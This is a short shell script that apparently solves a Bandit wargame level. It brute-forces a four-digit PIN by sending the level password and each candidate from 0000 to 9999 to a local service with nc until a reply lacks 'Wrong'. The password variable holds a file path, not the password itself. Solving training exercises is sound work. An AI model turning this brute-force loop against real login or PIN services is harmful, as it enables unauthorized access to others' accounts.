#!/bin/sh

#My script kept getting interrupted due to a "fork: retry: no child processes" error.
#Not sure if this script is inefficient or the Docker host was under heavy load, but
#if this happens to you, just change the script to the last number and restart.

#Just put the password here in the file if you want
password=~/bandit24pass

for i in $(seq -w 0000 1 9999)
do {
  if
    echo $password $i| nc localhost 30002 | grep Wrong > /dev/null
  then
    echo $password $i
  else
    echo $password $i| nc localhost 30002
    exit
  fi
   }
done
